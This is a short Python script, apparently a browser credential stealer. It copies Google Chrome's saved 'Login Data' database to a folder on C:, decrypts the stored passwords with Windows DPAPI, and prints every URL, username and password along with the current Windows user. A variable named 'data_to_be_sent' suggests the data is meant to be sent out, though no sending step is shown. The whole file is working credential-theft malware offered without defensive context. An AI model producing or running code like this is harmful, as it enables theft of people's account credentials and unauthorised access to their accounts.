import json
import os
import sqlite3
import shutil
import getpass

try:
    import win32crypt
except ImportError:
    win32crypt = None


def main():
    data = get_passwords()
    if data:
        print_passwords(data)


def get_passwords():
    if win32crypt is None:
        print("[!] win32crypt module not available. This script runs only on Windows.")
        return None

    data_to_be_sent = {}
    data_list = []
    path = get_path()
    try:
        connection = sqlite3.connect(path + '\\Login Data')
        cursor = connection.cursor()
        v = cursor.execute(
            'SELECT action_url, username_value, password_value FROM logins')
        value = v.fetchall()

        for origin_url, username, password in value:
            try:
                password = win32crypt.CryptUnprotectData(
                    password, None, None, None, 0)[1]
                if password:
                    data_list.append({
                        'origin_url': origin_url,
                        'username': username,
                        'password': password.decode('utf-8')
                    })
            except Exception as e:
                continue

    except sqlite3.OperationalError as e:
        print(f"[!] Error: {e}")
        return None

    data_to_be_sent["user"] = getpass.getuser()
    data_to_be_sent["passwords"] = data_list
    return data_to_be_sent


def print_passwords(data):
    print(f"[+] Extracted passwords for user: {data['user']}\n")
    for entry in data['passwords']:
        print(f"URL: {entry['origin_url']}")
        print(f"Username: {entry['username']}")
        print(f"Password: {entry['password']}\n")


def get_path():
    source = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\Login Data'
    target = "C:\\prog"
    try:
        os.makedirs(target, exist_ok=True)
    except Exception as e:
        print(f"[!] Could not create target directory: {e}")
    shutil.copy(source, target)
    return target


if __name__ == '__main__':
    main()
